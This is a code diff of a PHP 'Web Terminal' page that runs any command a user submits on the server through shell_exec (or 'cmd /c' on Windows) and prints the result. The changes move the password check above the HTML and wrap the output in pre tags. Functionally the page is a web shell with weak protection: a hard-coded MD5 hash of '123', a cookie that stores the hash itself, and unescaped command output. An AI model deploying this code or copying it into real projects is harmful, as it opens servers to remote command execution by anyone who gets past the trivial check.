@@ -1,3 +1,26 @@
+<?php
+// Password protection
+$password = "202cb962ac59075b964b07152d234b70"; // MD5 hash of "123"
+
+// Check if password cookie is set and matches
+if (isset($_COOKIE['password']) && $_COOKIE['password'] === $password) {
+    $authenticated = true;
+} else {
+    $authenticated = false;
+}
+
+// If form is submitted, check password and set cookie if correct
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["password"])) {
+    $enteredPassword = md5($_POST["password"]);
+    if ($enteredPassword === $password) {
+        setcookie('password', $password, time() + (86400 * 30), "/"); // Set cookie for 30 days
+        $authenticated = true;
+    } else {
+        $authenticated = false;
+        $errorMessage = "Incorrect password!";
+    }
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -63,29 +86,6 @@
 </head>
 <body>
     <div class="container">
-        <?php
-        // Password protection
-        $password = "202cb962ac59075b964b07152d234b70"; // MD5 hash of "123"
-        
-        // Check if password cookie is set and matches
-        if (isset($_COOKIE['password']) && $_COOKIE['password'] === $password) {
-            $authenticated = true;
-        } else {
-            $authenticated = false;
-        }
-
-        // If form is submitted, check password and set cookie if correct
-        if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["password"])) {
-            $enteredPassword = md5($_POST["password"]);
-            if ($enteredPassword === $password) {
-                setcookie('password', $password, time() + (86400 * 30), "/"); // Set cookie for 30 days
-                $authenticated = true;
-            } else {
-                $authenticated = false;
-                $errorMessage = "Incorrect password!";
-            }
-        }
-        ?>
         <?php if ($authenticated): ?>
             <div class="terminal">
                 <h1>Welcome to Web Terminal</h1>
@@ -102,6 +102,8 @@
                         if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                             // Windows
                             $output = shell_exec("cmd /c " . $command);
+                            // Format output for Windows commands like dir
+                            $output = nl2br($output); // Convert new lines to <br> tags
                         } else {
                             // Unix/Linux/MacOS
                             $output = shell_exec($command);
@@ -111,7 +113,7 @@
                         if ($output === null) {
                             echo "No output";
                         } else {
-                            echo $output;
+                            echo '<pre>' . $output . '</pre>'; // Wrap output in <pre> tags for better formatting
                         }
                     }
                     ?>
